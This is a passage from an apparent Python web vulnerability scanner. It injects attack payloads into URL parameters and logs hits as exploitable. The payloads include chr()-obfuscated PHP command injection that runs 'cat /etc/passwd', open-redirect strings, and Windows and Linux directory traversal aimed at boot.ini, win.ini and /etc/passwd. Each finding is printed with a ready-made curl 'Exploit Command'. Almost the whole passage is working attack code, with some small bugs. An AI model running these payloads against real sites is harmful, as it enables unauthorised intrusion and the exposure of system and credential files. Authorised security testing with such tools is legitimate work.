            print(OKRED + "[+] Vulnerable URL: " + rce_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + rce_url + "' | egrep PHP --color=auto" + RESET)
            f.write("P1 - Critical, Command Execution, " + str(rce_url) + ", " + str(rce_exploit) + "\n")

    except:
        pass

    # RCE PHP Check 2 ######################################################################################
    try:
        rce_exploit = urllib.parse.quote('{${passthru(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100))}}{${exit()}}')
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET)

        rce_url = new_url.replace("INJECTX", rce_exploit)
        http_request = urllib.request.urlopen(rce_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + rce_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "root:" in http_response:
            print(OKRED + "[+] Linux PHP Command Injection Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rce_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + rce_url + "' | egrep root: --color=auto" + RESET)
            f.write("P1 - Critical, Command Execution, " + str(rce_url) + ", " + str(rce_exploit) + "\n")

    except:
        pass

    # RCE PHP Check 3 ######################################################################################
    try:
        rce_exploit = urllib.parse.quote('{${passthru(chr(115).chr(108).chr(101).chr(101).chr(112).chr(32).chr(49).chr(48))}}{${exit()}}')
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET)

        rce_url = new_url.replace("INJECTX", rce_exploit)
        http_request = urllib.request.urlopen(rce_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + rce_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "root:" in http_response:
            print(OKRED + "[+] PHP Command Injection Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rce_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + rce_url + "' | egrep root: --color=auto" + RESET)
            f.write("P1 - Critical, Command Execution, " + str(rce_url) + ", " + str(rce_exploit) + "\n")

    except:
        pass

logo()
if len(sys.argv) < 2:
    print("You need to specify a URL to scan (ie. -u https://site.com). Use --help for all options.")
    sys.exit()
else:
    parser = optparse.OptionParser()
    parser.add_option('-u', '--url',
                      action="store", dest="url",
                      help="Full URL to spider", default="")

    parser.add_option('-c', '--cookie',
                      action="store", dest="cookie",
                      help="Cookies to send", default="")

    parser.add_option('-v', '--verbose',
                      action="store", dest="verbose",
                      help="Set verbose mode ON", default="n")

options, args = parser.parse_args()
cookies = str(options.cookie)
verbose = str(options.verbose)
full_url = str(options.url)
payload = "INJECTX"
http_status_base = "404"
http_length_base = "0"

try:
    http_request_base = urllib.request.urlopen(full_url)
    http_response_base = http_request_base.read()
    http_length_base = len(http_response_base)
    http_status_base = http_request_base.getcode()

    print(RESET)
    print(COLOR3 + ">>> " + OKORANGE + full_url + COLOR2 + " [" + OKRED + str(http_status_base) + COLOR2 + "]" + " [" + COLOR3 + str(http_length_base) + COLOR2 + "]" + RESET)
    print(COLOR3 + "======================================================================================================" + RESET)

except:
    print(RESET)
    print(COLOR3 + ">>> " + OKORANGE + full_url + COLOR2 + " [" + OKRED + str(http_status_base) + COLOR2 + "]" + " [" + COLOR3 + str(http_length_base) + COLOR2 + "]" + RESET)
    print(COLOR3 + "======================================================================================================" + RESET)

if str(http_status_base) == "404":
    print(COLOR1 + "[F] Received HTTP Status 404 - Page Not Found. Skipping..." + RESET)

elif str(http_status_base) == "403":
    print(COLOR1 + "[F] Received HTTP Status 403 - Page Not Found. Skipping..." + RESET)

else:
    if "=" in full_url:

        parsed = urllib.request.urlparse(full_url)
        params = urllib.parse.parse_qsl(parsed.query)
        param_list = []
        param_vals = []
        param_length = 0
        for x,y in params:
            param_list.extend([str(x + "=")])
            param_vals.extend([str(urllib.parse.quote_plus(y))])
            param_length = param_length + 1

        # FIND BASE URL
        dynamic_url = full_url.find("?")
        base_url = str(full_url[:dynamic_url + 1])

        # LIST EACH PARAMETER
        active_fuzz = 1
        i = 1

        http_request_base = urllib.request.urlopen(full_url)
        http_response_base = http_request_base.read()
        http_length_base = len(http_response_base)
        http_status_base = http_request_base.getcode()

        print(RESET)
        print(COLOR3 + ">>> " + OKORANGE + full_url + COLOR2 + " [" + OKRED + str(http_status_base) + COLOR2 + "]" + " [" + COLOR3 + str(http_length_base) + COLOR2 + "]" + RESET)
        print(COLOR3 + "======================================================================================================" + RESET)

        while i <= param_length and active_fuzz <= param_length:
            if (i < param_length and i == active_fuzz):
                print(OKORANGE + "[D] Fuzzing Parameter: " + param_list[i-1] + RESET)
                print(OKORANGE + "----------------------------------------------------" + RESET)
                base_url += param_list[i-1] + payload + "&"
                i = i+1

            elif (i == param_length and i == active_fuzz):
                print(OKORANGE + "[D] Fuzzing Parameter: " + param_list[i-1] + RESET)
                print(OKORANGE + "----------------------------------------------------" + RESET)
                base_url += param_list[i-1] + payload
                active_fuzz = active_fuzz+1
                i = i+1
                active_scan()
                base_url = str(full_url[:dynamic_url + 1])

            elif (i == param_length and i != active_fuzz):
                base_url += param_list[i-1] + param_vals[i-1]
                active_fuzz = active_fuzz+1
                i = 1
                active_scan()
                base_url = str(full_url[:dynamic_url + 1])

            elif (i == param_length):
                base_url += param_list[i-1] + param_vals[i-1]
                active_fuzz = active_fuzz+1
                i = 1
                active_scan()
                base_url = str(full_url[:dynamic_url + 1])

            else:
                base_url += param_list[i-1] + param_vals[i-1] + "&"
                i = i+1


    else:
        new_url = full_url + 'INJECTX'
        redirect_exploit = urllib.parse.quote('//google.com')

        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET)

        redirect_url = new_url.replace("INJECTX", redirect_exploit)

        try:
            http_request = urllib.request.urlopen(redirect_url)
            http_response = str(http_request.read())
            http_length = len(http_response)
            http_status = http_request.getcode()
            http_length_diff = str(http_length_base - http_length)

            if (verbose == "y"):
                print(COLOR2 + "[i] New URL: " + redirect_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

            if "<title>Google</title>" in http_response:
                print(OKRED + "[+] Open Redirect Found! " + RESET)
                print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
                print(OKGREEN + "[c] Exploit Command: curl -s -I '" + redirect_url + "' | egrep location --color=auto" + RESET)
                f.write("P3 - MEDIUM, Open Redirect, " + str(redirect_url) + ", " + str(redirect_exploit) + "\n")

        except:
            pass

        # Open Redirect ######################################################################################
        redirect_exploit = urllib.parse.quote('/<>//google.com')
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET)

        redirect_url = new_url.replace("INJECTX", redirect_exploit)

        try:
            http_request = urllib.request.urlopen(redirect_url)
            http_response = str(http_request.read())
            http_length = len(http_response)
            http_status = http_request.getcode()
            http_length_diff = str(http_length_base - http_length)

            if (verbose == "y"):
                print(COLOR2 + "[i] New URL: " + redirect_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

            if "<title>Google</title>" in http_response:
                print(OKRED + "[+] Open Redirect Found! " + RESET)
                print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
                print(OKGREEN + "[c] Exploit Command: curl -s -I '" + redirect_url + "' | egrep location --color=auto" + RESET)
                f.write("P3 - MEDIUM, Open Redirect, " + str(redirect_url) + ", " + str(redirect_exploit) + "\n")

        except:
            pass

        new_url = full_url + 'INJECTX'

        # Open Redirect ######################################################################################
        redirect_exploit = urllib.parse.quote('/%252F%252Fgoogle.com')
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET)

        redirect_url = new_url.replace("INJECTX", redirect_exploit)

        try:
            http_request = urllib.request.urlopen(redirect_url)
            http_response = str(http_request.read())
            http_length = len(http_response)
            http_status = http_request.getcode()
            http_length_diff = str(http_length_base - http_length)

            if (verbose == "y"):
                print(COLOR2 + "[i] New URL: " + redirect_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

            if "<title>Google</title>" in http_response:
                print(OKRED + "[+] Open Redirect Found! " + RESET)
                print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
                print(OKGREEN + "[c] Exploit Command: curl -s -I '" + redirect_url + "' | egrep location --color=auto" + RESET)
                f.write("P3 - MEDIUM, Open Redirect, " + str(redirect_url) + ", " + str(redirect_exploit) + "\n")

        except:
            pass

        new_url = full_url + 'INJECTX'

        # Open Redirect ######################################################################################
        redirect_exploit = urllib.parse.quote('////google.com/%2e%2e')
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET)

        redirect_url = new_url.replace("INJECTX", redirect_exploit)

        try:
            http_request = urllib.request.urlopen(redirect_url)
            http_response = str(http_request.read())
            http_length = len(http_response)
            http_status = http_request.getcode()
            http_length_diff = str(http_length_base - http_length)

            if (verbose == "y"):
                print(COLOR2 + "[i] New URL: " + redirect_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

            if "<title>Google</title>" in http_response:
                print(OKRED + "[+] Open Redirect Found! " + RESET)
                print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
                print(OKGREEN + "[c] Exploit Command: curl -s -I '" + redirect_url + "' | egrep location --color=auto" + RESET)
                f.write("P3 - MEDIUM, Open Redirect, " + str(redirect_url) + ", " + str(redirect_exploit) + "\n")

        except:
            pass

        new_url = full_url + 'INJECTX'

        # Open Redirect ######################################################################################
        redirect_exploit = urllib.parse.quote('/https:/%5cgoogle.com/')
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET)

        redirect_url = new_url.replace("INJECTX", redirect_exploit)

        try:
            http_request = urllib.request.urlopen(redirect_url)
            http_response = str(http_request.read())
            http_length = len(http_response)
            http_status = http_request.getcode()
            http_length_diff = str(http_length_base - http_length)

            if (verbose == "y"):
                print(COLOR2 + "[i] New URL: " + str(redirect_url) + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + str(http_length_diff) + COLOR2 + "]" + RESET)

            if "<title>Google</title>" in http_response:
                print(OKRED + "[+] Open Redirect Found! " + RESET)
                print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
                print(OKGREEN + "[c] Exploit Command: curl -s -I '" + redirect_url + "' | egrep location --color=auto" + RESET)
                f.write("P3 - MEDIUM, Open Redirect, " + str(redirect_url) + ", " + str(redirect_exploit) + "\n")

        except:
            pass

        new_url = full_url + 'INJECTX'

        # Windows Directory Traversal ######################################################################################
        traversal_exploit = urllib.parse.quote('..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini')
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)

        traversal_url = new_url.replace("INJECTX", traversal_exploit)

        try:
            http_request = urllib.request.urlopen(traversal_url)
            http_response = str(http_request.read())
            http_length = len(http_response)
            http_length_diff = str(http_length_base - http_length)
            http_status = http_request.getcode()
            if (verbose == "y"):
                print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

            if "boot loader" in http_response or "16-bit" in http_response:
                print(OKRED + "[+] Windows Directory Traversal Found! " + RESET)
                print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
                print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep Windows --color=auto" + RESET)
                f.write("P2 - HIGH, Directory Traversal, " + str(traversal_url) + ", " + str(traversal_exploit) + "\n")
        except:
            pass

        new_url = full_url + 'INJECTX'

        # Windows Directory Traversal 2 ######################################################################################
        traversal_exploit = urllib.parse.quote('..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini%00')
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)

        traversal_url = new_url.replace("INJECTX", traversal_exploit)

        try:
            http_request = urllib.request.urlopen(traversal_url)
            http_response = str(http_request.read())
            http_length = len(http_response)
            http_length_diff = str(http_length_base - http_length)
            http_status = http_request.getcode()
            if (verbose == "y"):
                print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

            if "boot loader" in http_response or "16-bit" in http_response:
                print(OKRED + "[+] Windows Directory Traversal Found! " + RESET)
                print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
                print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep Windows --color=auto" + RESET)
                f.write("P2 - HIGH, Directory Traversal, " + str(traversal_url) + ", " + str(traversal_exploit) + "\n")
        except:
            pass


        new_url = full_url + 'INJECTX'


        # Windows Directory Traversal 3 ######################################################################################
        try:
            traversal_exploit = urllib.parse.quote('..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00test.htm')
            if (verbose == "y"):
                print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)

            traversal_url = new_url.replace("INJECTX", traversal_exploit)

            try:
                http_request = urllib.request.urlopen(traversal_url)
                http_response = str(http_request.read())
                http_length = len(http_response)
                http_length_diff = str(http_length_base - http_length)
                http_status = http_request.getcode()
                if (verbose == "y"):
                    print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

                if "boot loader" in http_response or "16-bit" in http_response:
                    print(OKRED + "[+] Windows Directory Traversal Found! " + RESET)
                    print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
                    print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep Windows --color=auto" + RESET)
                    f.write("P2 - HIGH, Directory Traversal, " + str(traversal_url) + ", " + str(traversal_exploit) + "\n")
            except:
                pass
        except:
            pass

        # Linux Directory Traversal ######################################################################################
        traversal_exploit = urllib.parse.quote("/../../../../../../../../../../../../../../../../../etc/passwd")
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)

        traversal_url = new_url.replace("INJECTX", traversal_exploit)

        try:
            http_request = urllib.request.urlopen(traversal_url)
            http_response = str(http_request.read())
            http_length = len(http_response)
            http_length_diff = str(http_length_base - http_length)
            http_status = http_request.getcode()
            if (verbose == "y"):
                print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

            if "root:" in http_response:
                print(OKRED + "[+] Linux Directory Traversal Found! " + RESET)
                print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
                print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep root --color=auto" + RESET)
                f.write("P2 - HIGH, Directory Traversal, " + str(traversal_url) + ", " + str(traversal_exploit) + "\n")

        except:
            pass

        new_url = full_url + 'INJECTX'

        # Linux Directory Traversal 2 ######################################################################################

        traversal_exploit = urllib.parse.quote("/../../../../../../../../../../../../../../../../../etc/passwd%00")
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)

        traversal_url = new_url.replace("INJECTX", traversal_exploit)

        try:
            http_request = urllib.request.urlopen(traversal_url)
            http_response = str(http_request.read())
            http_length = len(http_response)
            http_length_diff = str(http_length_base - http_length)
            http_status = http_request.getcode()

            if (verbose == "y"):
                print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

            if "root:" in http_response:
                print(OKRED + "[+] Linux Directory Traversal Found! " + RESET)
                print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
                print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep root --color=auto") + RESET
                f.write("P2 - HIGH, Directory Traversal, " + str(traversal_url) + ", " + str(traversal_exploit) + "\n")

        except:
            pass

print(OKORANGE + "______________________________________________________________________________________________________" + RESET)
print(RESET)
print(RESET)
f.close()